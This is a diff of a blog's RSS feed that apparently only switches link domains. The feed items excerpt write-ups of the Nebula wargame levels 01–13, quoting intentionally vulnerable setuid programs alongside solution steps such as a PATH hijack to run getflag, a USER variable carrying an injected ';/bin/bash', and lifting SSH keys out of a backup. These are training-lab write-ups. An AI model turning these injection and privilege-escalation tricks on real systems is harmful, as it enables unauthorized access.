@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Security on Zea&#39;s</title>
-    <link>http://zealoct.github.io/tags/security/</link>
+    <link>http://jhan.xyz/tags/security/</link>
     <description>Recent content in Security on Zea&#39;s</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
     <lastBuildDate>Sun, 26 Jan 2014 21:54:12 +0800</lastBuildDate>
     
-	<atom:link href="http://zealoct.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="http://jhan.xyz/tags/security/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Exploit Exercises - Nebula Level 13</title>
-      <link>http://zealoct.github.io/post/2014-01-26-nebula-level13/</link>
+      <link>http://jhan.xyz/post/2014-01-26-nebula-level13/</link>
       <pubDate>Sun, 26 Jan 2014 21:54:12 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-26-nebula-level13/</guid>
+      <guid>http://jhan.xyz/post/2014-01-26-nebula-level13/</guid>
       <description>About There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
 To do this level, log in as the level13 account with the password level13 . Files for this level can be found in /home/flag13.
 Source code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;string.h&amp;gt; #define FAKEUID 1000 int main(int argc, char **argv, char **envp) { int c; char token[256]; if(getuid() !</description>
@@ -24,10 +24,10 @@ Source code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; 
     
     <item>
       <title>Exploit Exercises - Nebula Level 12</title>
-      <link>http://zealoct.github.io/post/2014-01-26-nebula-level12/</link>
+      <link>http://jhan.xyz/post/2014-01-26-nebula-level12/</link>
       <pubDate>Sun, 26 Jan 2014 20:12:53 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-26-nebula-level12/</guid>
+      <guid>http://jhan.xyz/post/2014-01-26-nebula-level12/</guid>
       <description>About There is a backdoor process listening on port 50001.
 To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12.
 Source code -- /home/flag12/flag12.lua local socketlocal socket = require(&amp;quot;socket&amp;quot;) local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001)) function hash(password) prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;) data = prog:read(&amp;quot;*all&amp;quot;) prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(&amp;quot;Password: &amp;quot;) client:settimeout(60) local line, err = client:receive() if not err then print(&amp;quot;trying &amp;quot; .</description>
@@ -35,10 +35,10 @@ Source code -- /home/flag12/flag12.lua local socketlocal socket = require(&amp;q
     
     <item>
       <title>Exploit Exercises - Nebula Level 11</title>
-      <link>http://zealoct.github.io/post/2014-01-26-nebula-level11/</link>
+      <link>http://jhan.xyz/post/2014-01-26-nebula-level11/</link>
       <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-26-nebula-level11/</guid>
+      <guid>http://jhan.xyz/post/2014-01-26-nebula-level11/</guid>
       <description>About The /home/flag11/flag11 binary processes standard input and executes a shell command.
 There are two ways of completing this level, you may wish to do both :-)
 To do this level, log in as the level11 account with the password level11 . Files for this level can be found in /home/flag11.
@@ -47,10 +47,10 @@ Source code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; 
     
     <item>
       <title>Exploit Exercises - Nebula Level 10</title>
-      <link>http://zealoct.github.io/post/2014-01-25-nebula-level10/</link>
+      <link>http://jhan.xyz/post/2014-01-25-nebula-level10/</link>
       <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-25-nebula-level10/</guid>
+      <guid>http://jhan.xyz/post/2014-01-25-nebula-level10/</guid>
       <description>About The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
 To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.
 Source Code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;errno.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { char *file; char *host; if(argc &amp;lt; 3) { printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(&amp;quot;Connecting to %s:18211 .</description>
@@ -58,10 +58,10 @@ Source Code #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; 
     
     <item>
       <title>Exploit Exercises - Nebula Level 09</title>
-      <link>http://zealoct.github.io/post/2014-01-24-nebula-level09/</link>
+      <link>http://jhan.xyz/post/2014-01-24-nebula-level09/</link>
       <pubDate>Fri, 24 Jan 2014 11:43:40 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-24-nebula-level09/</guid>
+      <guid>http://jhan.xyz/post/2014-01-24-nebula-level09/</guid>
       <description>About There&amp;rsquo;s a C setuid wrapper for some vulnerable PHP code&amp;hellip;
 To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.
 Source code &amp;lt;?php function spam($email) { $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email); $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email); return $email; } function markup($filename, $use_me) { $contents = file_get_contents($filename); $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents); $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents); $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents); return $contents; } $output = markup($argv[1], $argv[2]); print $output; ?</description>
@@ -69,10 +69,10 @@ Source code &amp;lt;?php function spam($email) { $email = preg_replace(&amp;quot
     
     <item>
       <title>Exploit Exercises - Nebula Level 08</title>
-      <link>http://zealoct.github.io/post/2014-01-24-nebula-level08/</link>
+      <link>http://jhan.xyz/post/2014-01-24-nebula-level08/</link>
       <pubDate>Fri, 24 Jan 2014 11:43:31 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-24-nebula-level08/</guid>
+      <guid>http://jhan.xyz/post/2014-01-24-nebula-level08/</guid>
       <description>About World readable files strike again. Check what that user was up to, and use it to log into flag08 account.
 To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.
 Solution 用*level08*登录之后回看到一个名为*capture.pcap*的文件，记录了一次抓包的结果。把这个文件scp出来之后分析，中间有一处显示：
@@ -82,10 +82,10 @@ Password: backdoor...00Rm8.ate  看样子是*flag08*用户的密码，不过用�
     
     <item>
       <title>Exploit Exercises - Nebula Level 07</title>
-      <link>http://zealoct.github.io/post/2014-01-13-nebula-level07/</link>
+      <link>http://jhan.xyz/post/2014-01-13-nebula-level07/</link>
       <pubDate>Mon, 13 Jan 2014 15:49:10 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-13-nebula-level07/</guid>
+      <guid>http://jhan.xyz/post/2014-01-13-nebula-level07/</guid>
       <description>About The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
 To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
 Source Code #!/usr/bin/perl use CGI qw{param}; print &amp;quot;Content-type: text/html\n\n&amp;quot;; sub ping { $host = $_[0]; print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;); @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`; foreach $line (@output) { print &amp;quot;$line&amp;quot;; } print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;); } # check if Host set.</description>
@@ -93,10 +93,10 @@ Source Code #!/usr/bin/perl use CGI qw{param}; print &amp;quot;Content-type: tex
     
     <item>
       <title>Exploit Exercises - Nebula Level 06</title>
-      <link>http://zealoct.github.io/post/2014-01-13-nebula-level06/</link>
+      <link>http://jhan.xyz/post/2014-01-13-nebula-level06/</link>
       <pubDate>Mon, 13 Jan 2014 15:48:33 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-13-nebula-level06/</guid>
+      <guid>http://jhan.xyz/post/2014-01-13-nebula-level06/</guid>
       <description>About The flag06 account credentials came from a legacy unix system.
 To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06.
 Check out /etc/passwd
@@ -106,10 +106,10 @@ reference</description>
     
     <item>
       <title>Exploit Exercises - Nebula Level 05</title>
-      <link>http://zealoct.github.io/post/2014-01-13-nebula-level05/</link>
+      <link>http://jhan.xyz/post/2014-01-13-nebula-level05/</link>
       <pubDate>Mon, 13 Jan 2014 14:16:44 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-13-nebula-level05/</guid>
+      <guid>http://jhan.xyz/post/2014-01-13-nebula-level05/</guid>
       <description>About Check the flag05 home directory. You are looking for weak directory permissions
 To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05.
 Solution Copy the file /home/flag05/.backup/backup-19072011.tgz in to home directory of level05.
@@ -119,10 +119,10 @@ level05@nebula:~$ tar -xvf backup-19072011.tgz .ssh/ .ssh/id_rsa.pub .ssh/id_rsa
     
     <item>
       <title>Exploit Exercises - Nebula Level 04</title>
-      <link>http://zealoct.github.io/post/2014-01-10-nebula-level04/</link>
+      <link>http://jhan.xyz/post/2014-01-10-nebula-level04/</link>
       <pubDate>Fri, 10 Jan 2014 20:43:48 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-10-nebula-level04/</guid>
+      <guid>http://jhan.xyz/post/2014-01-10-nebula-level04/</guid>
       <description>About This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
 To do this level, log in as the level04 account with the password level04 . Files for this level can be found in /home/flag04.
 Solution Source code for /home/flag04/flag04 is
@@ -131,10 +131,10 @@ Solution Source code for /home/flag04/flag04 is
     
     <item>
       <title>Exploit Exercises - Nebula Level 03</title>
-      <link>http://zealoct.github.io/post/2014-01-09-nebula-level03/</link>
+      <link>http://jhan.xyz/post/2014-01-09-nebula-level03/</link>
       <pubDate>Thu, 09 Jan 2014 17:03:25 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-09-nebula-level03/</guid>
+      <guid>http://jhan.xyz/post/2014-01-09-nebula-level03/</guid>
       <description>About Check the home directory of flag03 and take note of the files there.
 There is a crontab that is called every couple of minutes.
 To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.
@@ -143,10 +143,10 @@ Solution No source code is available for this level, but there is a shell script
     
     <item>
       <title>Exploit Exercises - Nebula Level02</title>
-      <link>http://zealoct.github.io/post/2014-01-09-nebula-level02/</link>
+      <link>http://jhan.xyz/post/2014-01-09-nebula-level02/</link>
       <pubDate>Thu, 09 Jan 2014 15:13:38 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-09-nebula-level02/</guid>
+      <guid>http://jhan.xyz/post/2014-01-09-nebula-level02/</guid>
       <description>基本过程与level01一样，先看/home/flag02/flag02的源代码：
 #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv, char **envp) { char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;)); printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer); system(buffer); }  先通过$USER构建了一个字符串，然后执行该字符串。比如正常情况下
 buffer=&amp;quot;/bin/echo level02 is cool&amp;quot;  在这里echo程序用了绝对路径，不过那个$USER明显是让我们加以利用的……在本例中echo程序是动不了的了，那怎么能执行其他的命令呢？也很简单，Linux本来就可以在一行中执行多条语句，这里选择用“;”来分割。如下修改$USER
@@ -156,10 +156,10 @@ USER=&amp;quot;haha; /bin/bash&amp;quot;  其实这里完全可以使用/bin/get
     
     <item>
       <title>Exploit Exercises - Nebula Level01</title>
-      <link>http://zealoct.github.io/post/2014-01-09-nebula-level01/</link>
+      <link>http://jhan.xyz/post/2014-01-09-nebula-level01/</link>
       <pubDate>Thu, 09 Jan 2014 14:54:40 +0800</pubDate>
       
-      <guid>http://zealoct.github.io/post/2014-01-09-nebula-level01/</guid>
+      <guid>http://jhan.xyz/post/2014-01-09-nebula-level01/</guid>
       <description>有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：
 #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv, char **envp) { gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;); }  前边代码的作用在上一篇博客中提到了，为了使当前的effective uid为flag01，所以system这一句是以flag01这个user的权限执行的。通过/usr/bin/env程序执行了echo程序，在屏幕上打印“and now what？”，不过在执行echo这个命令的时候没有使用绝对路径，使得通过修改$PATH来执行任意程序成为了可能。在本例中，通过修改$PATH和重定向来直接以flag01用户执行/bin/getflag程序：
 ~ $ export PATH=/home/level01:$PATH ~ $ ln -s /bin/getflag /home/level01/echo ~ $ /home/flag01/flag01 You have successfully executed getflag on a target account  这样就可以了。通过重定向其他程序为/home/level01/echo，可以用flag01用户执行任意程序。</description>
